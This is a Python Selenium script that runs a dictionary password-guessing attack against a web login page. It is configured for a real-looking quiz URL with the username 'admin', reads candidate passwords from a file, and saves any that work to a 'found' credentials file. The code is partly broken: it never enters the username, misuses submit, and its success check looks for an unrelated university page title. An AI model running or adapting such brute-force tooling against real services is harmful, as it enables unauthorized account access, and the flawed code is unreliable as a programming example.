from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time

class Guessing:
	def __init__(self, url, username, passwords):
		self.url = url
		self.username = username
		self.passwords = passwords
		self.driver = webdriver.Chrome()
	
	def guest(self, url = "https://ats.tinkoff.ru/quiz/mathfight/", passwords = "passwords.txt"):
		url = self.url
		passwords = self.passwords
		with open(passwords) as passwordsFile:
			count = 0
			for password in passwordsFile:
				response = self.webDriverStart({'url': url, 'username': self.username, 'password': password.rstrip(),'remember': 'yes' })
				if response != None:
					self.writeFile("users.txt", {"url": url, "username": self.username, "password": password.rstrip()})
					break
				else:
					count += 1
					print(f"{count}-й раз | {self.username}:{password.rstrip()}")
					pass
			self.driver.close()
			
	def webDriverStart(self, data):
		try:
			driver = self.driver
			driver.get(data["url"])
			username = driver.find_element_by_css_selector("input")
			username.click()
			username.send_keys(data["password"])
			element = driver.find_element_by_css_selector("button").send_keys(Keys.ENTER)
			element.submit()
			try:
				error = driver.find_element_by_css_selector('.error').text
				if "Неправильное имя пользователя" in error:
					return None
			except Exception:
				error = driver.find_element_by_css_selector('.pagetitle').text
				if "Кафедра информатики и программирования" in error:
						return data
			
		except Exception:
			print("Ошибка драйвера")
			return None

	def writeFile(self, fileName, data):
		url = data["url"]
		username = data["username"]
		password = data["password"]
		with open(fileName, "a") as passwordsFound:
			print("-------------------", file = passwordsFound)
			print(f"Адрес: {url}", file = passwordsFound)
			print(f"Логин: {username}", file = passwordsFound)
			print(f"Пароль: {password}", file = passwordsFound)
		self.userFound(data)
		
	def userFound(self, data):
		url = data["url"]
		username = data["username"]
		password = data["password"]
		print("-------------------")
		print(f"Адрес: {url}")
		print(f"Логин: {username}")
		print(f"Пароль: {password}")
		print("-------------------")


if __name__ == "__main__":
	# Configuration
	url = "https://ats.tinkoff.ru/quiz/mathfight/"
	username = "admin"
	passwords = "passwords.txt"
	# Start program
	startOne = Guessing(url, username, passwords)
	startOne.guest(url, "passwords.txt")